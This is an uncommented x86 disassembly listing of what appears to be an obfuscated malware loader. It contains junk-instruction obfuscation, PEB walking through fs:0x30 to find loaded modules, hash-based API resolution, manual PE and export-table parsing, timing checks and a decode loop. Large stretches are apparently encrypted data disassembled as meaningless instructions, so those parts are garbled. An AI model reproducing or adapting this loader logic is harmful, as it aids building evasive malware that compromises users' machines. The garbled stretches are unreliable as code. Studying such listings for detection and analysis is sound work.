sub_4013f5
mov eax [ esp ]
add esp 0x4
test ebx ebx
adc edi 0x4
and [ edi - 0x4 ] 0x0
add [ edi - 0x4 ] eax
test ecx ecx
jno r-xdata
call sub_40140f
or edx 0xffffffff
not edx
add edx [ fs : 0x1c ]
mov ecx 0x0
xor ecx [ edx + 0x10 ]
inc [ ecx + 0x8 ]
and eax 0x0
add eax [ ecx + 0x8 ]
retn 0x4
sub_40140f
pop eax
add edi 0x4
mov [ edi - 0x4 ] 0x0
or [ edi - 0x4 ] eax
test edi edi
jno r-xdata
call sub_401425
or edx 0xffffffff
not edx
adc edx [ fs : 0x1c ]
or ecx 0xffffffff
not ecx
xor ecx [ edx + 0x10 ]
dec [ ecx + 0x8 ]
or eax 0xffffffff
not eax
adc eax [ ecx + 0x8 ]
retn 0x4
sub_40144b
add esp 0x4
mov eax [ esp - 0x4 ]
test ebx ebx
adc edi 0x4
or [ edi - 0x4 ] 0xffffffff
not [ edi - 0x4 ]
adc [ edi - 0x4 ] eax
add esp 0x4
mov eax [ esp - 0x4 ]
and ecx ecx
adc edi 0x4
or [ edi - 0x4 ] 0xffffffff
not [ edi - 0x4 ]
add [ edi - 0x4 ] eax
or esi esi
jae r-xdata
call sub_40147f
push eax
xor eax [ esp ]
test esi esi
adc esp 0x4
retn 0xc
sub_401497
add esp 0x4
mov eax [ esp - 0x4 ]
stosd [ edi ]
add edi 0x4
or [ edi - 0x4 ] 0xffffffff
not [ edi - 0x4 ]
add [ edi - 0x4 ] eax
test esi esi
jae r-xdata
call sub_4014b4
push eax
xor eax [ esp ]
sub esp 0xfffffffc
retn 0x4
sub_4014b4
mov eax [ esp ]
add esp 0x4
mov [ edi ] 0x0
or [ edi ] eax
test edi edi
adc edi 0x4
mov [ edi ] eax
add edi 0x4
jmp r-xdata
call sub_4014d1
aam 0x8
add [ eax ] al
sar [ ebx + 0x583e6c03 ] cl
xor dh [ cs : edx ]
xor [ ecx ] esi
add esi [ ebx ]
xor [ edi ] dh
xor [ ecx ] esi
xor [ edi ] ch
xor al [ ebx ]
xor [ 0x3036303b ] dh
cmp esi [ eax ]
xor [ edi + ebp ] 0x2e
xor dh [ eax ]
xor edi [ ebx ]
add edi [ ebx + 0x33b3107 ]
sub esi [ edi ]
cmp dh [ edi ]
cmp esi [ edi ]
adc esi [ 0x33a3437 ]
das
cmp esi [ 0x30350332 ]
xor eax 0x322f373a
add esi [ ecx ]
xor [ edi ] dh
xor eax 0x3233b34
and esp [ ebx ]
pop esi
cmp [ edi + 0x71 ] dh
jpe r-xdata
dec edi
add esi [ ecx ]
sub eax 0x474e4c47
insb
pushad
add [ esi + 0x2 ] esi
dec ebp
and al 0x2a
sub eax 0x43667160
add eax [ edx + 0x3e ]
inc edx
pushad
ja r-xdata
sub eax 0x6d66734c
inc ebx
and al 0x61
push 0x6d
sub eax 0x9381b07
and [ di ] 0x2b1a8347
sub bh [ eax ]
jbe r-xdata
insd
push es
jne r-xdata
xor dh [ edi ]
ja r-xdata
ja r-xdata
dec esi
bound esi [ edi + 0x6b ]
pop eax
dec esi
push eax
pop ebx
pop es
add ebx [ ebx + 0x4c ]
popad
imul esp [ esi + 0x60 ] 0x50033877
insd
je r-xdata
push 0x60
jno r-xdata
sub al 0x13
das
and al 0x27
xor al [ ebx + 0x61767097 ]
add esi [ eax + 0x77 ]
jno r-xdata
je r-xdata
push edi
pop es
jpo r-xdata
add [ edx ] esi
add al [ ecx ]
xor [ edx ] eax
and [ 0x706c0353 ] ch
sub eax 0x6c036f65
insb
jno r-xdata
adc ebx [ ss : esi + 0x2a ]
cmp [ edx + 0x6 ] bh
dec esp
inc edx
inc edi
dec esp
mov [ 0x502d4147 ] eax
ja r-xdata
sub eax 0x77016664
add [ edi ] cl
sub al 0x34
sub bh [ eax ]
insw
ja r-xdata
inc edx
sub eax [ ebx ]
and al 0x54
push eax
pushad
jno r-xdata
sub bl [ edi + 0x6d ]
jo r-xdata
inc esi
inc esp
pop esp
xor ebp [ edi ]
xor al 0x28
add esi [ esi + 0x2a ]
cmp [ ecx + 0x3e ] dl
and al 0x5f
pop edi
add edx [ eax + 0x6c ]
ja r-xdata
and al 0x97
and [ ebx + 0x39 ] 0x23
push 0x77
imul ebx [ eax + 0x33 ] 0x29
pop esi
add eax [ ecx ]
xor al [ edx ]
add [ ecx ] esi
add ah [ eax ]
sub eax 0x706c0353
push eax
and al 0x28
pushad
insd
insb
add al [ bp + si ]
add eax 0x6f625567
jbe r-xdata
inc ebx
retn
dec ebx
outsb
add eax [ ebx - 0x3d ]
jpe r-xdata
inc ebx
jpe r-xdata
sub ebp [ edx ]
add [ 0x62665a13 ] al
jno r-xdata
insb
outsd
bound esi [ edi + 0x6a ]
pop es
outsd
add bx [ eax ]
push edi
push edx
sub esp [ ebx + ebx ]
dec ebp
push esi
dec esi
add ah [ 0x283e0b07 ]
sub [ ebx ] al
push edi
cmp [ edx + 0x65 ] ch
sub edx [ edi + 0x3d ]
xor al [ ebx ]
sub dh [ edi + 0x6b ]
jno r-xdata
sub esp [ edx * 2 + 0x77626f6c ]
push 0x7
bound esi [ edi + 0x66 ]
inc esi
inc ebx
jae r-xdata
ja r-xdata
and al 0x2f
xor ebp [ ebx + 0x2f ]
pop edi
pop edi
and al 0x38
jo r-xdata
add [ eax ] 0x5f
sbb [ esi + 0x27 ] eax
ja r-xdata
cmp ch [ 0x6d5f2a33 ]
bound esi [ ecx + 0x66 ]
add ebx [ edi + 0x5f ]
dec esi
ja r-xdata
add ebx [ edi + 0x74 ]
js r-xdata
push 0x6c
insd
add eax 0x83190633
jle r-xdata
dec esp
jae r-xdata
pop edi
push ecx
bound sp [ edi + 0x3 ]
adc eax [ eax + 0x3 ]
outsd
insb
jo r-xdata
dec esi
push es
insb
pop eax
imul edi [ esi ] 0xffffff83
dec ebx
sub esp [ esp ]
sub [ esi + 0x28 ] dh
or [ eax ] 0x6d6c4e83
ja r-xdata
je r-xdata
sub eax 0x77626703
bound edx [ edi + 0x7a ]
jae r-xdata
aaa
add edx [ edx + 0x6d ]
add ebp [ 0x6f666b50 ]
outsd
and al 0x2a
add edi [ eax ]
push edx
push eax
sub eax 0x3756d46
push 0x71
insb
insd
outsb
sub al [ ebx + 0x72 ]
push esp
push 0x7
insd
or [ fs : ebx ] 0x54
bound esi [ ecx + 0x6d ]
dec esp
inc ebx
insd
pop ecx
insb
insd
inc ax
inc ebx
push eax
jo r-xdata
bound ebp [ edx + 0x43 ]
or [ edi + 0x6a ] al
jo r-xdata
outsb
dec edi
or [ ecx + 0x43 ] eax
xchg [ ebx + 0x19 ] eax
inc esi
daa
dec esi
insb
add edi [ ecx + 0x6a ]
outsd
cmp [ ebx ] esp
and al 0x3
push ecx
insd
retn
xchg edx eax
insb
sub eax 0x2b233303
push esp
push 0x6d
insb
add esi [ eax + esi * 2 + 0x38 ]
and ecx [ esi + 0x50 ]
dec edx
inc esi
add esp [ ebx ]
sub al 0x36
add eax [ esi + 0x7b ]
jae r-xdata
jo r-xdata
das
jno r-xdata
add al [ ebx + 0x245f5f00 ]
cmp [ eax + 0x3e ] dh
jle r-xdata
aaa
inc edx
pop ecx
bound ebp [ esi ]
jns r-xdata
sub eax 0x58032b29
add eax [ eax ]
add [ edx + 0x1 ] 0x54070331
jno r-xdata
insd
inc edi
push esp
dec esp
push ecx
add eax [ edi + 0x24 ]
cmp [ edi + 0x3e ] dh
and al 0x4b
cmp [ eax + 0x3e ] ch
insd
pop es
sub eax 0x2d2b8377
jno r-xdata
outsd
add [ ebp + 0x61 ] bl
and esp [ edx + 0x70 ]
xor ax 0x337
push edx
insd
cmp [ ebp + 0x6 ] ch
xor al [ edi ]
cmpsd [ esi ] [ edi ]
and al 0x77
je r-xdata
add eax [ esi ]
xchg [ edx ] esi
pop ebx
test [ ds : ebp + 0x46 ] ecx
dec ebp
sub eax 0x73732342
outsd
push 0x60
shl [ edx ] 0x24
cmp [ ecx ] al
dec edx
inc edi
xchg edx eax
pop ebx
sub bh [ eax ]
dec edx
sub eax 0xc4c30a50
insd
ja r-xdata
add esp [ ecx + 0x6f ]
inc bp
push 0x71
jo r-xdata
push eax
inc eax
or ebp [ esi + ebp * 2 + 0x73 ]
add eax [ eax ]
popad
push 0x6f
insb
jno r-xdata
dec eax
add eax [ eax + 0x56 ]
and al 0x28
push ecx
sub [ edx + ecx * 2 ] ah
add ebp [ ebp + 0x77 ]
jno r-xdata
jae r-xdata
jg r-xdata
add [ edi + 0x43 ] esi
and al 0x2f
xor cl [ ebp + ecx + 0xb ]
dec esi
jl r-xdata
adc ebp [ 0x2c6e6c60 ]
jo r-xdata
add edx [ ecx + 0x76 ]
insd
inc eax
jbe r-xdata
or al bl
les ebp [ ebp + 0x77 ]
cmp [ edx + ecx * 2 + 0x2d ] 0x4d
bound ecx [ ebx ]
jne r-xdata
dec esi
inc ebx
dec eax
jbe r-xdata
jno r-xdata
insd
sub bp [ ebp + 0x58032b29 ]
add esp [ edx + 0x60 ]
push esi
movsb [ edi ] [ esi ]
sbb ah [ ebp + 0x63 ]
and [ ebx + eax ] 0x2f
add bl [ ebx - 0x1e ]
sub [ edi + 0x4e ] cl
0x2d4d2328 0x4c57
pop edi
sub eax 0x630d070c
add al al
push cs
inc ebx
jb r-xdata
add esp [ ebx + 0x6e3c6b60 ]
inc ebx
cmp [ esi ] bh
jbe r-xdata
jo r-xdata
sub eax 0x750b624d
push 0x64
retn 0x24a7
ja r-xdata
sub ebp [ ebx + eax ]
sub ebx [ edi + 0x3c ]
sub bh [ edi + 0x2b ]
retn 0x24a7
inc esp
and al 0x56
jo r-xdata
or [ eax ] 0x44
sub eax 0xe82f4c57
add al [ ebx + 0x8016669 ]
sub al 0x6a
sub ch [ edx ]
jbe r-xdata
sub ecx [ edx + 0x2a ]
pop ss
cmp [ ebp - 0x7d ] ah
mov ch 0x75
retn
jo r-xdata
add eax [ edi + 0x70 ]
and eax 0x28243e72
retn
sub eax 0x776409c3
imul edi [ eax ] 0x75
sub [ ebx ] dh
sub [ edx ] ch
js r-xdata
ja r-xdata
cmp ebp [ esi + 0x6a ]
jns r-xdata
insb
outsb
jae r-xdata
jno r-xdata
sub esp [ esp + esi * 2 ]
push 0x6d
outsb
and ebp [ fs : esi + 0x77 ]
jo r-xdata
inc eax
xchg ebx eax
and ebx [ eax ]
inc esp
ja r-xdata
imul esp [ esi + 0x1 ] 0x126d4608
mov [ 0x7762717c ] eax
push ebp
sub eax ebp
add al 0x2a
mov [ 0xffffffffa92a760a ] al
js r-xdata
jb r-xdata
arpl [ ecx ] ax
and ebp [ esi + 0x22 ]
jo r-xdata
jne r-xdata
je 0x5f7367f6
push 0xffffff8b
ja r-xdata
outsd
add [ ecx + 0x6a ] ah
outsd
bound ebp [ esi + esi ]
push 0x6f
inc edx
and [ fs : ebx + 0x39 ] 0x23
sub esp [ eax + edx * 2 ]
inc esi
dec edi
pop edi
add eax [ ebx ]
sub eax 0x715f135f
insb
insb
mov [ 0x6066505a ] eax
adc [ esi + 0x23 ] esi
cmp [ edx + 0x40 ] edi
jecxz r-xdata
jne r-xdata
adc [ esi - 0x5c ] 0x1a
add bp [ gs : 0x6077626e ]
push 0x7b332f43
xor dh [ esi ]
inc bx
pop ds
xor ecx [ ebx ]
das
inc esp
and al 0x28
imul ebp [ ebx ] 0x2c
add ebp [ ebx ]
pop edi
cmp al 0x2a
sub eax 0x6566716b
add ebp [ 0x6077626e ]
pop eax
add eax [ edx ]
imul esp [ edx + 0x75 ] 0x1700162
jg r-xdata
or eax 0xec00263
xor ebp [ eax ]
sub bh [ eax + 0x76 ]
pop edi
adc eax [ eax + 0x76 ]
jno r-xdata
push 0xe3248128
push ebp
add ebp [ edx + 0x71 ]
jbe r-xdata
sub al [ ebx ]
jno r-xdata
inc esi
insd
adc ah [ ebx + 0x7762717c ]
inc edi
add edi [ ebx ]
push ebp
jno r-xdata
push 0x267602d
inc edx
and esi [ edi + 0x2b ]
push 0x26
insb
jno r-xdata
adc ecx [ ebx ]
push ebx
jno r-xdata
jno r-xdata
add eax [ esi + 0x40 ]
push edi
and ebp [ ecx ]
and eax [ ebp + 0x51 ]
add ecx [ esi + ecx * 2 + 0x23 ]
inc edx
insd
ja r-xdata
cmp al 0x24
xor [ ecx + edi ] esp
and al 0x24
sub al [ ebx ]
sub ch [ 0x60667b46 ]
push edx
jbe r-xdata
add ebp [ eax ]
sub ebp [ ebx ]
cmp eax 0x32a353e
push eax
jo r-xdata
push 0x43
xchg ebx eax
outsd
add ebx [ ebx + 0x3 ]
sub eax 0x776a7652
add [ ebx + 0x55 ] al
sub al [ eax + 0x209483b1 ]
and ecx [ esi - 0x1e ]
movsb [ edi ] [ esi ]
insb
mov [ 0xffffffffa8252503 ] eax
retn 0x62ab
push 0x2a2a0507
fistp [ ebp + 0x2b ]
ja r-xdata
sub ebp [ edx + 0x26 ]
mov [ 0x42858389 ] eax
cmp [ esi ] 0x6a2d7703
insd
insd
jno r-xdata
push esi
sub eax 0x2da22767
bound ebp [ ebp + 0x60 ]
jae r-xdata
adc [ ebx ] 0xb
daa
jbe r-xdata
push esp
mov [ 0x3a16503 ] eax
cmp [ eax + 0x43 ] dl
xor ah [ ecx + eax * 4 + 0x40 ]
sub esi [ edi + 0x6 ]
push ss
add al [ ebx - 0x7a ]
insb
insd
bound ebp [ edi + 0x5f ]
pop edi
push esp
add esi [ ecx ]
dec eax
dec edi
jae r-xdata
sbb eax 0x665041c5
ja r-xdata
pop esi
inc ebx
sub eax 0x6f776a77
cmpsw [ esi ] [ edi ]
jns r-xdata
add eax [ ebx ]
lodsb [ esi ]
add [ ebp - 0x5ed1d12a ] ah
salc
bound esp [ eax ]
insb
adc esp [ ebp + 0x23 ]
dec edx
and al [ ebx + 0x66676d21 ]
inc edx
retn
sub eax 0x6e6c7165
mov edx [ edi + 0x4e ]
sub bh [ fs : eax ]
push esp
sub edx [ esi - 0x7e ]
and al 0xe3
or [ esi + 0x40432d2a ] 0x6e
sub eax [ edi ]
xor ebp [ edx ]
arpl [ ecx + 0x2b ] sp
sub bh [ esi ]
adc ebp [ 0xffffffffe3706a67 ]
xor [ edi ] esi
or eax 0x6b3c122a
add al [ esi ]
pop es
add eax 0x5ddb2a2a
sub esi [ edi + 0x49 ]
sub ebp [ ebx ]
jo r-xdata
ja r-xdata
bound eax [ ebx ]
outsb
cmp [ esi + ebp ] sp
and al 0x38
pushad
add ch dh
mov [ 0x7477664d ] eax
insb
jno r-xdata
cmp [ ecx + 0x13 ] ah
xor [ cs : ebx + esi * 8 ] esi
jmp r-xdata
cmp esi [ ebx ]
push eax
add [ ecx + 0x2 ] edi
jae r-xdata
insb
insd
jpe r-xdata
nop
mov [ 0x6a4d2198 ] al
mov [ 0x773f8748 ] al
dec ebp
sub dh [ esi + 0x28 ]
and esp [ eax + 0x2d610342 ]
insd
add cl [ esi + eax * 8 ]
movsd [ edi ] [ esi ]
xchg ecx eax
ja r-xdata
js r-xdata
jpo r-xdata
add esi [ eax ]
cmp esi [ ecx + ebp * 2 ]
cmp dh [ ebx ]
cmp [ esi ] ch
movsd [ edi ] [ esi ]
add dh [ edi ]
adc [ esi - 0x2cfdc4fe ] 0x45
xor dh [ cs : ebx ]
xor edi [ edx ]
cmp edx ebx
adc edi [ esi ]
xor [ cs : ebx + esi * 8 ] esi
xor eax 0x3d3d3713
cmp dl bl
add [ edi ] dh
push 0x28
cmp ebp [ edx ]
jpo r-xdata
rcl [ es : ebx ] 0x1
in al dx
or eax 0xf870b73
add esi [ ecx + 0x66 ]
ja r-xdata
sub ebp [ edx ]
jle r-xdata
pop ebx
add ebp [ 0x776a7652 ]
bound ecx [ ebx ]
inc eax
inc edx
jecxz r-xdata
outsb
push edi
xchg esi eax
jecxz r-xdata
cmp dh [ esp + esi ]
xor eax 0xd67b0e1b
adc eax 0x32830ff3
xor eax 0x3e72782a
xor esi [ ebx ]
cmp dh [ esi ]
cmp edx ebx
inc ecx
jns r-xdata
je r-xdata
xor dh [ eax + esi ]
push 0x27
xor [ es : ebx + 0x7 ] ah
jns r-xdata
push 0xffffffc3
cmp eax 0x7f5e363d
add eax [ eax ]
r-xdata
pop esi
jno r-xdata
adc esp [ edx + 0x6 ]
mov [ 0x76380521 ] eax
sub [ ebx + 0x60422435 ] 0x60
jae r-xdata
dec edi
jecxz r-xdata
dec esi
jbe r-xdata
pushad
das
and al 0x2d
sti
jae r-xdata
add [ ebx ] dh
jpo r-xdata
add dl [ esi + ecx ]
or al [ ecx ]
cmp edx [ ebx ]
cmp [ edx + 0x3e ] ah
sub ch [ eax ]
xor [ edx ] 0x36
pop esi
rol [ eax ] cl
aaa
dec ebx
sub esi [ eax + 0x2a ]
js r-xdata
and esi [ esi + 0x2 ]
adc al 0xe
jno r-xdata
imul eax [ ebx ] 0x33
sub eax 0x28247f33
pushad
sub [ 0xffffffffa303a324 ] ch
xor edx [ eax + 0x1 ]
jns r-xdata
xor bh [ edx ]
xor [ eax ] bh
popad
add esi [ esi ]
cmp esi [ edi ]
inc ebx
jno r-xdata
mov al [ 0x2d610342 ]
pop ebp
add edi [ esi ]
and al 0x76
ja r-xdata
jpo r-xdata
push ecx
add [ ebx + 0x58 ] edi
xor [ ebx ] eax
cmp esi [ ss : edi ]
xor dh [ eax + esi ]
bound edi [ edx + 0x2b ]
test [ esi + 0x3d ] 0x1f
cmp eax 0x400ab031
and esp [ esi + 0x2 ]
sub [ ebx ] edi
cmp [ ebx ] al
xor [ ecx + 0x2 ] ah
xor [ ecx + 0x2 ] ah
aaa
popad
add dh [ edi ]
pop esi
inc ebx
sub bh [ eax + 0x66 ]
jne r-xdata
cmp esp [ cs : esi + edi * 4 ]
arpl [ ebx + 0x876224 ] bp
jae 0x786a5a16
sub ebp [ ebx ]
jns r-xdata
and al 0x33
mov bh 0x38
dec ecx
dec cx
mov [ fs : 0x4784496b ] al
test eax 0x77784879
inc ebx
js r-xdata
outsd
retn 0x610b
jb r-xdata
inc edx
jno r-xdata
inc eax
js r-xdata
add esi [ edx ]
aaa
ja r-xdata
jg r-xdata
inc ebx
or ebx [ ecx ]
imul eax [ esi + ebp ] 0x2227e369
adc [ eax + 0x69 ] ebx
xor al [ edx ]
push edx
sbb al 0x59
sub ebx [ ecx + 0x2b ]
pop edx
sub esp [ edx + 0x3 ]
das
sub ch [ ss : edi ]
dec ebp
sub ebp [ ecx + 0x2f ]
add esp [ ecx + 0x2f ]
pushad
das
sub ch [ bp + si ]
das
dec edx
bound eax [ edx ]
das
bound eax [ edi ]
sub ch [ edi ]
xor eax [ 0x2a330331 ]
cmp al 0x32
xor bh [ ss : ebx ]
inc ebx
xor esi [ ebx ]
xor [ edi ] esi
cmp bh [ ecx ]
adc eax [ edx ]
aaa
or dl [ edx ]
add bh [ ebx ]
arpl [ ss : edi ] cx
xor [ ss : edx ] bh
xor [ esi ] cl
adc al [ edx ]
xor eax 0x9d130213
cmp dh [ edi ]
xor esi [ ebx ]
add esi [ esi + esi ]
cmp edi [ ebx ]
cmp [ esi ] ebp
cmp edi [ edx ]
cmp [ edx ] 0x37
cmp dh [ esi + esi ]
xor dh [ edi ]
push ebx
xor eax 0xf336629
mov bl 0xf
pushad
push ebx
or ah [ ecx + 0x2f ]
or [ eax ] esi
rcl [ eax ] cl
popad
adc ecx [ 0x7e773e62 ]
mov eax [ 0x620b2362 ]
das
jb r-xdata
xor eax 0x2322f5e
sbb bl [ 0x2a3b2c03 ]
and eax 0x65657b33
add ebp [ edx ]
aas
aas
sub esi [ ecx ]
aaa
add eax [ eax ]
mov [ 0x5c438602 ] eax
pushad
add [ ebx ] 0x60
das
sub al [ fs : ebx ]
add [ ebx + 0x59 ] ah
sub esp [ edi + 0x2f ]
imul edx edx 0x0
ror [ ebx ] cl
push 0x3021e548
sbb esp [ edx - 0x30 ]
or [ edi ] ebp
add bl [ ecx - 0x5d ]
add al [ esi - 0x7c9fa3bd ]
add esp [ eax + 0x2f ]
sub ebp [ esi + 0x3f ]
pop ss
jg r-xdata
js r-xdata
inc eax
add dl bl
adc al dh
sub [ eax ] al
popad
add [ edi + 0x2b ] edi
pushad
push edx
lds ebp [ edi - 0x1d ]
add [ esi + eax + 0x4d ] edx
sub esi [ edi - 0x69 ]
adc ah [ edx ]
adc al 0x45
ja r-xdata
pushad
sub bh [ eax + 0x12 ]
push esi
add [ ebp + 0x3f ] ch
aas
bound eax [ eax ]
insd
cmp eax 0x2b3d833d
xor [ ecx ] dh
pushad
sub bh bl
or al [ edx ]
push edx
jpe r-xdata
pop ds
add [ ebp + 0x3 ] esp
add edi [ eax ]
outsd
sub edi [ ebx + 0x25 ]
and esi [ ebx + 0x2a ]
sub [ ebx ] ch
jpe r-xdata
insd
insb
js r-xdata
outsd
jno r-xdata
adc eax [ esi ]
add [ ecx + 0x25 ] ah
pushad
jecxz r-xdata
add dl bl
add [ edx ] eax
inc esp
add al 0x5a
sub ebp [ ebp + 0x2f ]
sub esp [ eax + 0x52 ]
add edi [ eax ]
outsb
mov edx 0x3d3d03d3
add edx [ eax ]
add esi [ edi + 0x3 ]
jpe r-xdata
jo r-xdata
mov ecx 0x444852a2
mov edx ebp
call sub_402a8c
push 0x0
push 0xa1
push 0x3
push 0x0
push 0x0
dec edx
adc dh [ ecx ]
push eax
jpe r-xdata
push es
and [ eax ] edi
xchg [ esi ] eax
mov [ 0x252a617d ] eax
push ecx
inc edi
ja r-xdata
sub esp [ ebx + 0x252a617d ]
mov ecx [ edx + 0x10 ]
xor eax eax
[ edi ]
lea edx [ edx + ecx - 0x10 ]
mov edi [ edx + 0x28 ]
insb
jb r-xdata
retn 0x8928
jae r-xdata
push 0x80000000
call sub_4026f8
arpl [ edx ] di
pop esp
push edi
imul ebp [ esi + 0x64 ] 0x5c73776f
jae r-xdata
add [ edx ] ch
ja r-xdata
sti
xor ebx [ ecx - 0x7d ]
sub edi [ ebx + 0x2f ]
jpe r-xdata
adc al dl
xlat
add ah [ ecx + 0x5d ]
pushad
pop ebp
call sub_4027ac
mov eax 0x1
retn 0xc
dec eax
js r-xdata
cmp ecx [ edx + 0x8 ]
jae r-xdata
add [ edi + 0x6a ] dl
inc eax
call eax
test eax eax
je r-xdata
insb
insb
add bh bh
rol [ ebp + 0x3e880fc0 ] 0x1
add eax [ eax ]
add [ ecx + 0x4be9b9c3 ] cl
lodsb [ esi ]
mov edx ebp
call sub_402a8c
push 0x0
push ebx
call eax
mov edi eax
mov ecx 0x526b2cc2
mov edx ebp
call sub_402a8c
push edi
push 0x40
add edx 0x28
mov ecx edi
sub ecx [ edx + 0xc ]
jb r-xdata
or dh al
xor esi [ edx ]
pop esp
jpe r-xdata
insd
or al 0x8b
inc eax
or al 0x8b
push 0x30788b18
cmp eax 0x426b747e
mov bl 0x3c
sub eax [ ecx + 0x22 ]
aaa
xor eax 0xe4024a05
pop esi
outsd
push 0x6d
push 0x30e7e70
or [ ecx + 0x30 ] esp
add [ eax ] al
add [ ebx + 0x408b0c40 ] cl
pop edx
lea eax [ ebx + esi ]
sub eax [ edx + 0x28 ]
mov edi [ edx + 0x78 ]
add edi eax
mov ecx [ edi + 0x14 ]
mov edi [ edi + 0x1c ]
add edi eax
mov eax [ edx + 0x28 ]
add eax 0x8
[ edi ]
lea edi [ ebx + esi ]
jmp r-xdata
cmp [ edx ] 0x6c65722e
jne r-xdata
mov ebx ecx
add ebx [ edx + 0x14 ]
mov ecx 0xbc53dac3
mov edx ebp
call sub_402a8c
push 0x0
call eax
mov esi eax
mov ecx 0xc7ab0b6f
call sub_402a50
test eax eax
je r-xdata
mov eax [ eax ]
cmp [ edi + 0x8 ] 0x6c0065
jne r-xdata
mov ebp [ eax + 0x18 ]
mov edi [ eax + 0x30 ]
mov edi [ edx + 0x14 ]
add edi esi
push esi
push edi
movzx edx [ esi + 0x3c ]
lea edx [ esi + edx ]
push edx
movzx eax [ edx + 0x6 ]
movzx ecx [ edx + 0x14 ]
sub_4014d1
mov esi [ esp ]
add esp 0x4
lodsd [ esi ]
call $+5
mov [ esp ] eax
push esi
mov ecx [ esp ]
add esp 0x4
add esp 0x4
mov edx [ esp - 0x4 ]
call $+5
dec esi
mov eax 0x0
xor eax [ ecx + 0x4 ]
add esp 0xfffffffc
mov [ esp ] esi
xor eax [ esp ]
and edi edi
sbb esp 0xfffffffc
push 0xff
and eax [ esp ]
test edi edi
adc esp 0x4
and ebx 0x0
or ebx 0x7cbec6c2
test ecx ecx
adc ebx 0x8341397b
cmp eax ebx
jne r-xdata
jmp [ esp ]
jmp r-xdata
call $+5
mov [ esp ] edx
lea edi [ ebp + 0x80 ]
add esp 0xfffffffc
mov [ esp ] edi
call $+5
test edx edx
sbb edi 0xffffffff
and ebx 0x0
add ebx [ ecx ]
add ecx 0x1
xor ebx esi
and [ edi - 0x1 ] 0x0
or [ edi - 0x1 ] ebx
stc
sbb edx 0x0
jne r-xdata
jmp [ esp ]
jmp r-xdata
mov ebx 0x0
or ebx [ fs : 0x30 ]
mov edx [ ebx + 0xc ]
mov ebx 0x0
add ebx [ edx + 0xc ]
call $+5
mov ecx 0x0
sub ecx [ ebx + 0x18 ]
neg ecx
mov edi 0x0
or edi [ ebx + 0x30 ]
and edx 0x0
or edx [ ebx ]
mov esi 0x0
add esi [ edi + 0x2 ]
or ebx 0xffffffff
not ebx
adc ebx edx
or eax 0xffffffff
not eax
or eax 0x34738709
add eax 0xcbf0796b
or esi 0x200020
call $+5
mov [ esp ] eax
xor eax esi
pop eax
jne r-xdata
jmp [ esp ]
jmp r-xdata
add esp 0xfffffffc
mov [ esp ] ecx
mov edx [ esp ]
add esp 0x4
and ecx 0x0
or ecx 0xa6c1d8bb
lea ecx [ ecx - 0x435c2b72 ]
call sub_401c5f
sub esp 0x4
mov [ esp ] eax
add esp 0x4
mov ebx [ esp - 0x4 ]
mov edx [ esp + 0xc ]
or eax 0xffffffff
not eax
xor eax esp
sub esp 0x4
mov [ esp ] eax
lea eax [ ebp + 0x80 ]
push edx
sub esp 0x4
mov [ esp ] eax
push 0x1000
lea edi [ ebp + 0x1080 ]
add esp 0xfffffffc
mov [ esp ] edi
sub esp 0x4
mov [ esp ] 0x2
call ebx
add esp 0x4
mov ecx [ esp - 0x4 ]
lea esi [ ebp + 0x1080 ]
or esi esi
mov [ esi + ecx ] 0x0
adc [ esi + ecx ] eax
test eax eax
jne r-xdata
or ebx 0xffffffff
not ebx
adc ebx [ fs : 0x30 ]
or eax 0xffffffff
not eax
or eax [ ebx + 0x10 ]
add esp 0xfffffffc
mov [ esp ] eax
pop edx
lea edi [ edx + 0x40 ]
xor eax eax
stosd [ edi ]
mov [ edi ] 0x0
xor [ edi ] eax
test eax eax
adc edi 0x4
and ecx 0x0
add ecx 0xb7626af0
lea ecx [ ecx - 0xe82e8ea ]
mov edx 0x0
sub edx [ ebp + 0x4 ]
neg edx
call sub_401c5f
call eax
mov edi 0x0
xor edi eax
mov ecx 0x0
or ecx 0x2000
or eax 0xffffffff
not eax
or eax 0x65322d79
add eax 0x9acdd2b3
[ edi ]
push 0x90b613ca
pop eax
lea eax [ eax + 0x6f49ec56 ]
[ edi ]
or ecx 0xffffffff
not ecx
xor ecx 0x5f73bff5
add ecx 0xb3904593
push [ ebp + 0x4 ]
pop edx
call sub_401c5f
call $+5
mov [ esp ] 0x1
call $+5
mov [ esp ] edi
call eax
push [ ebp + 0x8 ]
pop esi
or edi 0xffffffff
not edi
or edi 0xbadcaffe
call $+5
mov [ esp ] esi
or ebx ebx
sbb esi edi
pop esi
jne r-xdata
mov eax 0x0
xor eax 0x1da3f283
lea eax [ eax + 0x4992d7e ]
add esp 0xfffffffc
mov [ esp ] esi
lea edi [ ebp + 0x80 ]
and edi edi
adc edi 0x4
push eax
pop [ edi - 0x4 ]
or ecx 0xffffffff
not ecx
or ecx 0xf485743
add ecx 0xf0b7a91d
mov ebx 0x0
sub ebx edi
neg ebx
mov esi ecx
and eax 0x0
or eax 0x7b259553
add eax 0x84da6acd
call $+5
add edi 0x1
mov [ edi - 0x1 ] al
add eax 0x1
dec ecx
jne r-xdata
mov ecx 0x0
add ecx 0x9dacd6e7
lea ecx [ ecx + 0x1ea703dc ]
and edx 0x0
add edx [ ebp + 0x4 ]
call sub_401c5f
call eax
call sub_401431
mov eax 0x0
or eax 0xee155ade
add eax 0x91eae523
retn 0x8
push [ ebp + 0x44 ]
pop ebx
test ebx ebx
je r-xdata
jmp [ esp ]
jmp r-xdata
sub esp 0x4
mov [ esp ] 0x2
and edx 0x0
add edx [ ebp + 0x44 ]
mov eax 0x0
add eax [ ebx ]
add esp 0xfffffffc
mov [ esp ] edx
call [ eax + 0x14 ]
mov [ edi - 0x5e ] 0x80
and eax 0x0
or eax 0xafb00672
lea eax [ eax + 0x5a5d34b0 ]
mov ecx [ esp ]
add esp 0x4
mov [ edi - 0x24 ] 0x81
stosd [ edi ]
or ecx 0xffffffff
not ecx
xor ecx 0x3ce9b0bd
and edx edx
adc ecx 0xc3174f43
call $+5
rdtsc
call $+5
mov [ esp ] edx
xor edx [ esp ]
sub esp 0xfffffffc
div esi
mov eax 0x0
xor eax [ ebx ]
xchg [ ebx + edx ] al
mov [ ebx ] al
stc
sbb ecx 0x0
je r-xdata
pop eax
or eax 0xffffffff
not eax
or eax 0xb5e6dc4a
lea eax [ eax + 0x6c5643b8 ]
pop esi
mov [ edi ] 0x0
or [ edi ] eax
add edi 0x4
call $+5
xor eax eax
lodsb [ esi ]
test al al
jne r-xdata
jmp [ esp ]
cmp al 0x20
jae r-xdata
jmp r-xdata
test ebx ebx
sbb eax 0x20
xlat
test edi edi
sbb edi 0xffffffff
mov [ edi - 0x1 ] al
jmp [ esp ]
jmp [ esp ]
pop ecx
or eax 0xffffffff
not eax
